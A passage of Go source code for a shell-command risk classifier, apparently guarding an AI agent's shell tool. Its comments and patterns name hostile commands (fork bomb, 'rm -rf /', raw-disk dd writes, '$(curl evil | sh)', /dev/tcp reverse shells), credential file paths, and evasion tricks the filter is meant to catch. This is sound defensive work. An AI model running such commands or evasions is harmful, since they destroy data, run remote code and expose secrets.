				if cmd[k] == '\\' && k+1 < len(cmd) {
					k++
					continue
				}
				if cmd[k] == '`' {
					end = k
					break
				}
			}
			if end > 0 {
				body := cmd[i+1 : end]
				subs = append(subs, body)
				out.WriteByte(' ')
				out.WriteString(substValue(body))
				out.WriteByte(' ')
				i = end + 1
				continue
			}
		}

		out.WriteByte(cmd[i])
		i++
	}
	return out.String(), subs
}

// substValue returns the shell-side value a substitution body would expand
// to, well enough for classification. We can't actually execute the body,
// so we apply two pragmatic rules: `echo`/`printf BODY...` expands to the
// remaining tokens (covers the common `$(echo rm)` evasion); otherwise we
// fall back to the body's first token, which is the most likely program
// name the outer command would invoke. The body itself is also classified
// independently so commands like `$(curl evil | sh)` still trip the loop.
func substValue(body string) string {
	body = strings.TrimSpace(body)
	tokens := strings.Fields(body)
	if len(tokens) == 0 {
		return ""
	}
	if tokens[0] == "echo" || tokens[0] == "printf" {
		return strings.Join(tokens[1:], " ")
	}
	return tokens[0]
}

// stripCommandWrappers removes leading shell builtins that simply invoke
// their first argument as a command (POSIX `command`, `exec`, `builtin`).
// Applied repeatedly so `exec command rm -rf /` is reduced to `rm -rf /`.
func stripCommandWrappers(cmd string) string {
	wrappers := map[string]struct{}{
		"command": {},
		"exec":    {},
		"builtin": {},
	}
	for {
		trimmed := strings.TrimLeft(cmd, " \t")
		// Find first whitespace-separated token.
		sp := strings.IndexAny(trimmed, " \t")
		if sp <= 0 {
			return trimmed
		}
		first := trimmed[:sp]
		if _, ok := wrappers[first]; !ok {
			return trimmed
		}
		cmd = trimmed[sp+1:]
	}
}

// collapseUnquotedBackslashes removes unquoted backslash escapes so
// `\rm` and `r\m` both reduce to `rm`. Inside single quotes backslash is
// literal; inside double quotes it only escapes a few specific chars.
// This mirrors the shell behaviour we need for classification — we are
// not trying to be a fully accurate shell parser.
func collapseUnquotedBackslashes(cmd string) string {
	var out strings.Builder
	inSingle := false
	inDouble := false
	for i := 0; i < len(cmd); i++ {
		ch := cmd[i]
		switch {
		case ch == '\'' && !inDouble:
			inSingle = !inSingle
			out.WriteByte(ch)
		case ch == '"' && !inSingle:
			inDouble = !inDouble
			out.WriteByte(ch)
		case ch == '\\' && !inSingle && i+1 < len(cmd):
			// Drop the backslash, keep the next character.
			out.WriteByte(cmd[i+1])
			i++
		default:
			out.WriteByte(ch)
		}
	}
	return out.String()
}

// basenameFirstToken rewrites the first whitespace-separated token to
// its basename if it is an absolute path. This makes `/bin/rm -rf /`
// classify the same as `rm -rf /`. We only rewrite when the basename
// matches a known prefix set (rm/dd/sudo/...) so legitimate non-command
// arguments are not altered.
func basenameFirstToken(cmd string) string {
	trimmed := strings.TrimLeft(cmd, " \t")
	if !strings.HasPrefix(trimmed, "/") {
		return cmd
	}
	sp := strings.IndexAny(trimmed, " \t")
	var first, rest string
	if sp < 0 {
		first, rest = trimmed, ""
	} else {
		first, rest = trimmed[:sp], trimmed[sp:]
	}
	base := filepath.Base(first)
	if !isKnownCommandName(base) {
		return cmd
	}
	return base + rest
}

func isKnownCommandName(name string) bool {
	if name == "rm" || name == "sudo" {
		return true
	}
	return writePrefixes[name] ||
		systemPrefixes[name] ||
		destructivePrefixes[name] ||
		networkPrefixes[name] ||
		codeEvalPrefixes[name] ||
		installPrefixes[name] ||
		pipedShells[name] ||
		safeCommands[name] ||
		remoteRunPrefixes[name] ||
		execWrappers[name] ||
		privilegedWrappers[name]
}

// isRawBlocked checks the raw command string for patterns that are
// blocked regardless of tokenization artifacts.
func isRawBlocked(cmd string) bool {
	// Fork bomb
	if cmd == ":(){ :|:& };:" {
		return true
	}
	if strings.Contains(cmd, ":{") && strings.Contains(cmd, "}:") {
		return true
	}
	return false
}

// splitSegments splits token sequences on command separators.
// ;, &&, || all start a new segment. Pipe (|) is NOT a segment separator
// — it stays within a segment so code_execution detection can find it.
func splitSegments(tokens []string) [][]string {
	var segments [][]string
	var current []string

	for _, tok := range tokens {
		switch tok {
		case ";", "&&", "||":
			if len(current) > 0 {
				segments = append(segments, current)
				current = nil
			}
		default:
			current = append(current, tok)
		}
	}
	if len(current) > 0 {
		segments = append(segments, current)
	}
	return segments
}

// splitPipes splits a segment's tokens into pipe stages. Each stage is a
// command whose output feeds the next. Empty stages (from a leading/trailing
// or doubled pipe) are preserved and classified as Safe.
func splitPipes(tokens []string) [][]string {
	var stages [][]string
	var current []string
	for _, tok := range tokens {
		if tok == "|" {
			stages = append(stages, current)
			current = nil
			continue
		}
		current = append(current, tok)
	}
	stages = append(stages, current)
	return stages
}

// ── Wrappers ───────────────────────────────────────────────────────────

// privilegedWrappers run their argument command with elevated privileges.
// They impose a system_write floor and are then stripped so the inner
// command is classified on its own (which may escalate further, e.g.
// `sudo rm -rf /var` → destructive).
var privilegedWrappers = map[string]bool{
	"sudo": true, "doas": true, "pkexec": true,
}

// execWrappers transparently run their argument command. Stripping them stops
// `env rm -rf /`, `xargs rm -rf /`, `nohup curl … | sh`, `timeout 5 dd …`
// from hiding the real command behind a benign-looking head token.
var execWrappers = map[string]bool{
	"env": true, "xargs": true, "nohup": true, "nice": true, "ionice": true,
	"setsid": true, "stdbuf": true, "time": true, "timeout": true,
	"command": true, "exec": true, "builtin": true, "watch": true,
}

// unwrapWrappers strips leading shell assignments and execution wrappers and
// returns the inner command tokens plus a risk floor (system_write if a
// privileged wrapper was present). It conservatively skips wrapper option
// flags, `env` VAR=VALUE assignments, and the numeric/duration argument that
// timeout/nice take. Leading bare assignments (FOO=bar cmd …) are skipped so
// the real command is the one classified; an assignment-only command (no
// verb) is left empty and treated as Safe.
func unwrapWrappers(tokens []string) ([]string, RiskClass) {
	floor := Safe
	i := 0
	for i < len(tokens) && isAssignment(tokens[i]) {
		i++ // leading VAR=value assignment prefix
	}
	tokens = tokens[i:]
	i = 0
	for i < len(tokens) {
		name := commandName(tokens[i])
		priv := privilegedWrappers[name]
		if !priv && !execWrappers[name] {
			break
		}
		if priv {
			floor = worstOf(floor, SystemWrite)
		}
		i++ // consume the wrapper itself
		for i < len(tokens) {
			t := tokens[i]
			switch {
			case strings.HasPrefix(t, "-") && t != "-":
				i++ // wrapper option flag
			case name == "env" && isAssignment(t):
				i++ // env VAR=VALUE
			case (name == "timeout" || name == "nice" || name == "ionice") && isNumericish(t):
				i++ // timeout 5s / nice 10
			default:
				goto nextWrapper
			}
		}
	nextWrapper:
	}
	return tokens[i:], floor
}

// classifyResourceToken flags dangerous resources that may appear as any
// argument or redirect target, independent of the command verb: bash
// pseudo-device network channels (/dev/tcp, /dev/udp — reverse shells) and
// reads/writes of sensitive credential paths.
func classifyResourceToken(tok string) RiskClass {
	lt := strings.ToLower(tok)
	if strings.Contains(lt, "/dev/tcp/") || strings.Contains(lt, "/dev/udp/") {
		return NetworkEgress
	}
	if isSensitivePath(tok) {
		return SystemWrite
	}
	return Safe
}

// sensitivePathFragments are substrings that mark a path as carrying secrets.
// Matching is substring-based so it catches ~, /root, /home/<user>, and
// absolute variants alike. /etc/passwd is intentionally excluded — it is
// world-readable and accessed routinely, so flagging it is pure noise.
//
// This is deliberately distinct from ClassifyPath's home-sensitive-dir list:
// that classifies the *write* risk of an absolute filesystem path (for the
// file tool), whereas this flags *credential reads/writes* in a raw shell
// token (which may be ~-relative or carry an `of=`-style prefix). They
// overlap (~/.ssh, ~/.aws, ~/.gnupg) but are not interchangeable; if you add
// a credential location to one, consider whether the other needs it too.
var sensitivePathFragments = []string{
	"/etc/shadow", "/etc/gshadow", "/etc/sudoers", "/etc/ssl/private",
	"/.ssh", "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
	"/.aws/credentials", "/.aws/config", "/.config/gcloud",
	"/.kube/config", "/.docker/config.json", "/.netrc", "/.pgpass",
	"/.git-credentials", "/.gnupg", "/proc/self/environ", "/environ",
}

func isSensitivePath(tok string) bool {
	t := strings.TrimPrefix(strings.ToLower(tok), "~")
	for _, frag := range sensitivePathFragments {
		if strings.Contains(t, frag) {
			return true
		}
	}
	return false
}

// ── Small token helpers ────────────────────────────────────────────────

// commandName returns the program name from a token, taking the basename of
// absolute/relative paths so /bin/bash, /usr/bin/sudo and ./rm resolve to
// their command name for prefix matching.
func commandName(tok string) string {
	if strings.Contains(tok, "/") {
		return filepath.Base(tok)
	}
	return tok
}

// worstOf returns whichever class ranks higher (more severe).
func worstOf(a, b RiskClass) RiskClass {
	if Rank(b) > Rank(a) {
		return b
	}
	return a
}

// shellHasOperand reports whether a shell-interpreter invocation has a
// non-flag, non-redirect operand — i.e. a script file or process
// substitution it will execute. Bare `bash` / `sh` (interactive) has none.
func shellHasOperand(tokens []string) bool {
	for _, t := range tokens[1:] {
		if t == "" || t == ">" || t == ">>" || t == "<" {
			continue
		}
		if !strings.HasPrefix(t, "-") {
			return true
		}
	}
	return false
}

// flagArg returns the token immediately following flag, or "" if absent.
func flagArg(tokens []string, flag string) string {
	for i, t := range tokens {
		if t == flag && i+1 < len(tokens) {
			return tokens[i+1]
		}
	}
	return ""
}

// hasAny reports whether any token equals one of names.
func hasAny(tokens []string, names ...string) bool {
	for _, t := range tokens {
		for _, n := range names {
			if t == n {
				return true
			}
		}
	}
	return false
}

// isAssignment reports whether a token is a NAME=VALUE shell assignment
// (used to skip `env FOO=bar … cmd`). A leading-slash token like
// /a=b is a path, not an assignment.
func isAssignment(tok string) bool {
	eq := strings.IndexByte(tok, '=')
	if eq <= 0 || strings.HasPrefix(tok, "/") {
		return false
	}
	for _, r := range tok[:eq] {
		if !(r == '_' || (r >= 'A' && r <= 'Z') || (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9')) {
			return false
		}
	}
	return true
}

// isNumericish reports whether a token looks like a count or duration
// (5, 0.5, 10s, 2m) — the kind of argument timeout/nice take before the
// command they wrap.
func isNumericish(tok string) bool {
	return reNumericish.MatchString(tok)
}

var reNumericish = regexp.MustCompile(`^[0-9]+(\.[0-9]+)?[smhd]?$`)

// classifyCommand classifies a single command (no separators, no pipes).
// Wrapper stripping and pipe/segment handling happen in the callers.
func classifyCommand(tokens []string) RiskClass {
	if len(tokens) == 0 {
		return Safe
	}

	// Resolve the program name from its basename so /bin/rm, /usr/bin/curl
	// and ./sh classify the same as their bare names in any pipe stage.
	first := commandName(tokens[0])

	// Blocked
	if isBlocked(tokens) {
		return Blocked
	}

	// Destructive
	if isDestructive(first, tokens) {
		return Destructive
	}

	// System write
	if isSystemWrite(first, tokens) {
		return SystemWrite
	}

	// Code execution checks (pipe to shell, eval, -e/-c flags)
	if isCodeExecution(first, tokens) {
		return CodeExecution
	}

	// Network egress
	if isNetworkEgress(first, tokens) {
		return NetworkEgress
	}

	// Install
	if isInstall(first, tokens) {
		return Install
	}

	// Local write
	if isLocalWrite(first, tokens) {
		return LocalWrite
	}

	// Any argument that names a system path (read or write) — broader than
	// isSystemWrite's redirect-only check above, which runs earlier so a
	// redirect to a system path beats the LocalWrite classification.
	if touchesSystemPath(tokens) {
		return SystemWrite
	}

	// Fail closed: a recognised command used benignly is Safe; an
	// unrecognised verb is Unknown (deny-by-default). An empty token slice
	// (e.g. an assignment-only command after unwrapping) is Safe.
	if len(tokens) == 0 || isKnownCommandName(first) {
		return Safe
	}
	return Unknown
}

// ── Detection helpers ──────────────────────────────────────────────────

// blockDevicePrefixes are raw disk device paths. Writing to any of these
// (via dd of=, or a redirect) destroys a whole disk/partition.
var blockDevicePrefixes = []string{
	"/dev/sd", "/dev/nvme", "/dev/vd", "/dev/hd", "/dev/xvd",
	"/dev/mmcblk", "/dev/disk", "/dev/loop", "/dev/dm-",
}

func isBlockDevice(path string) bool {
	for _, p := range blockDevicePrefixes {
		if strings.HasPrefix(path, p) {
			return true
		}
	}
	return false
}

func isBlocked(tokens []string) bool {
	// A fully-specified dd write to a raw block device is unrecoverable and
	// blocked even in YOLO mode. A bare `dd if=… of=/dev/sda` (no other
	// operands) is still caught by isDestructive (deny-by-default but
	// overridable for legitimate disk imaging in godmode).
	if len(tokens) >= 4 && commandName(tokens[0]) == "dd" {
		for i, tok := range tokens {
			if strings.HasPrefix(tok, "of=") && containsBlockDevice(tok) {
				return true
			}
			// of= /dev/sda (value as a separate token)
			if tok == "of=" && i+1 < len(tokens) && isBlockDevice(tokens[i+1]) {
				return true
			}
		}
	}
	return false
}

func containsBlockDevice(tok string) bool {
	for _, p := range blockDevicePrefixes {
		if strings.Contains(tok, p) {
			return true
		}
	}
	return false
}

// rmRecursiveOrForce reports whether rm's flags include a recursive or force
// option, in any spelling: -r, -R, -f, combined (-rf, -fr, -rfv, -Rf),
// or long (--recursive, --force, --no-preserve-root).
func rmRecursiveOrForce(tokens []string) bool {
	for _, tok := range tokens[1:] {
		switch tok {
		case "--recursive", "--force", "--no-preserve-root", "-R":
			return true
		}
		if strings.HasPrefix(tok, "--") {
			continue
		}
		if strings.HasPrefix(tok, "-") {
			for _, r := range tok[1:] {
				if r == 'r' || r == 'R' || r == 'f' {
					return true
				}
			}
		}
	}
	return false
}

// isWipeTarget reports whether an rm argument denotes a catastrophic target:
// any absolute path outside /tmp and /workspace, or a relative target that
// expands to the current/parent/home directory or a glob.
func isWipeTarget(tok string) bool {
	if strings.HasPrefix(tok, "/") {
		return !strings.HasPrefix(tok, "/tmp") && !strings.HasPrefix(tok, "/workspace")
	}
	switch tok {
	case "*", ".", "..", "~", "$HOME", "$PWD", "${HOME}", "${PWD}":
		return true
	}
	// Globs/expansions rooted at cwd/parent/home: ./*, ../, ~/, $HOME/*
	for _, p := range []string{"~/", "$HOME", "${HOME}", "../", "./*"} {
		if strings.HasPrefix(tok, p) {
			return true
		}
	}
	return false
}

func isDestructive(first string, tokens []string) bool {
	// rm with a recursive/force flag aimed at a root path or a "wipe" target.
	if first == "rm" {
		if !rmRecursiveOrForce(tokens) {
			return false
		}
		for _, tok := range tokens[1:] {
			if isWipeTarget(tok) {
				return true
			}
		}
		return false
	}

	if !destructivePrefixes[first] || len(tokens) < 2 {
		return false
	}

	// mkfs, fdisk, parted, etc. — any usage is destructive
	if first != "dd" {
		return len(tokens) >= 1
	}

	// dd writing to a raw block device (of=/dev/sda etc.) is destructive.
	// Match only real block devices via containsBlockDevice/isBlockDevice —
	// NOT any "/dev/" substring, so benign discards like of=/dev/null and
	// of=/dev/stdout are not misclassified.
	for _, tok := range tokens {
		if strings.HasPrefix(tok, "of=") && containsBlockDevice(tok) {
			return true
		}
		if tok == "of=" && len(tokens) > 1 {
			for j := range tokens {
				if isBlockDevice(tokens[j]) {
					return true
				}
			}
		}
	}
	return false
}

func isSystemWrite(first string, tokens []string) bool {
	if first == "sudo" {
		return true
	}
	if systemPrefixes[first] {
		return true
	}
	// Check redirect targets for system paths
	for _, tok := range tokens {
		if tok == ">" || tok == ">>" {
			continue
		}
		if isSystemPath(tok) {
			// Check if it's a redirect target (token follows > or >>)
			for i, t := range tokens {
				if (t == ">" || t == ">>") && i+1 < len(tokens) && tokens[i+1] == tok {
					return true
				}
			}
		}
	}
	return false
}

func isLocalWrite(first string, tokens []string) bool {
	// echo without redirect is safe (just displaying text)
	if first == "echo" {
		for _, tok := range tokens {
			if tok == ">" || tok == ">>" {
				return true
			}
		}
		return false
	}
	if writePrefixes[first] {
		return true
	}
	// Any command with > or >> is a write
	for _, tok := range tokens {
		if tok == ">" || tok == ">>" {
			return true
		}
	}
	return false
}

func isNetworkEgress(first string, tokens []string) bool {
	if !networkPrefixes[first] {
		return false
	}
	// git push requires a remote argument
	if first == "git" {
		return hasArgAfter(tokens, "git", "push") && hasArgAfter(tokens, "push", "")
	}
	// rsync with remote target (contains :)
	if first == "rsync" {
		for _, tok := range tokens[1:] {
			if strings.Contains(tok, "@") && strings.Contains(tok, ":") {
				return true
			}
			if strings.Contains(tok, "::") {
				return true
			}
		}
		return false
	}
	// All other network commands are inherently egress
	return true
}

func isCodeExecution(first string, tokens []string) bool {
	// Pipe to shell interpreter
	for i, tok := range tokens {
		if tok == "|" && i+1 < len(tokens) && pipedShells[commandName(tokens[i+1])] {
			return true
		}
	}

	// source / . FILE executes a script in the current shell.
	if first == "source" || first == "." {
		return true
	}

	// npx/bunx/uvx/pipx fetch and run a (possibly remote) package.
	if remoteRunPrefixes[first] {
		return true
	}

	if !codeEvalPrefixes[first] {
		// go run / go tool / go generate compile and execute code.
		if first == "go" {
			for _, tok := range tokens[1:] {
				if tok == "run" || tok == "tool" || tok == "generate" {
					return true
				}
			}
		}
		// pnpm dlx / yarn dlx fetch and run a package (like npx).
		if (first == "pnpm" || first == "yarn") && hasAny(tokens, "dlx") {
			return true
		}
		// uv run / uv tool run execute code.
		if first == "uv" && hasAny(tokens, "run", "tool") {
			return true
		}
		return false
	}

	// eval is always code execution
	if first == "eval" {
		return true
	}

	// node/python/perl/ruby/php with -e, -c, -r flags
	for _, tok := range tokens[1:] {
		if tok == "-e" || tok == "-c" || tok == "-r" {
			return true
		}
	}

	return false
}

func isInstall(first string, tokens []string) bool {
	if !installPrefixes[first] {
		return false
	}

	// npm/pnpm/yarn/bun/pip/gem install / ci / add
	switch first {
	case "npm", "pnpm", "yarn", "bun", "pip", "pip3", "gem", "apk":
		for _, tok := range tokens[1:] {
			switch tok {
			case "install", "i", "ci", "add":
				return true
			}
		}
	}

	// cargo install
	if first == "cargo" {
		return hasArgAfter(tokens, "cargo", "install")
	}

	// go install <remote> OR go install <local-path>
	if first == "go" {
		hasInstall := false
		for _, tok := range tokens[1:] {
			if tok == "install" {
				hasInstall = true
				continue
			}
			if hasInstall {
				return true // go install <something> downloads deps
			}
		}
		return false // bare "go install" = local build only
	}

	// brew install
	if first == "brew" {
		return hasArgAfter(tokens, "brew", "install")
	}

	return false
}

// hasArgAfter returns true if the token after 'after' is 'target'.
// If target is empty, just checks that 'after' exists and has a successor.
func hasArgAfter(tokens []string, after, target string) bool {
	for i, tok := range tokens {
		if tok == after && i+1 < len(tokens) {
			if target == "" {
				return true
			}
			// Check next non-flag token
			for j := i + 1; j < len(tokens); j++ {
				if !strings.HasPrefix(tokens[j], "-") {
					return tokens[j] == target || target == ""
				}
			}
			return false
		}
	}
	return false
}

// touchesSystemPath reports whether any token names a system path (an
// argument or a redirect target alike). It is intentionally broader than the
// redirect-only scan in isSystemWrite — it catches reads/args such as
// `cat /etc/foo` or an unknown tool pointed at /usr — so both checks exist.
func touchesSystemPath(tokens []string) bool {
	for _, tok := range tokens {
		if tok == ">" || tok == ">>" {
			continue
		}
		if isSystemPath(tok) {
			return true
		}
	}
	return false
}

// isSystemPath returns true if the path targets a system directory.
var systemPathPrefixes = []string{"/etc/", "/usr/", "/bin/", "/lib/", "/var/", "/opt/", "/boot/", "/sbin/"}

func isSystemPath(path string) bool {
	for _, p := range systemPathPrefixes {
		if strings.HasPrefix(path, p) {
			return true
		}
	}
	return false
}

// ── Ranking ────────────────────────────────────────────────────────────

// Rank returns the severity order for priority comparison. Exported so
// consumers that enforce risk caps (e.g. the sub-agent maxRisk clamp) share
// this single ordering instead of mirroring it — a mirror silently drifts
// when a class is added, as happened with Unknown.
func Rank(cls RiskClass) int {
	switch cls {
	case Blocked:
		return 9
	case Destructive:
		return 8
	case Unknown:
		// Ranked above the prompt-level classes so a single unknown stage in
		// a pipeline/compound command dominates benign siblings (e.g.
		// `pip install x && weirdverb` stays deny-by-default), but below
		// Destructive/Blocked so those keep their more informative label.
		return 7
	case SystemWrite:
		return 6
	case CodeExecution:
		return 5
	case NetworkEgress:
		return 4
	case Install:
		return 3
	case LocalWrite:
		return 2
	case Safe:
		return 1
	default:
		return 0
	}
}
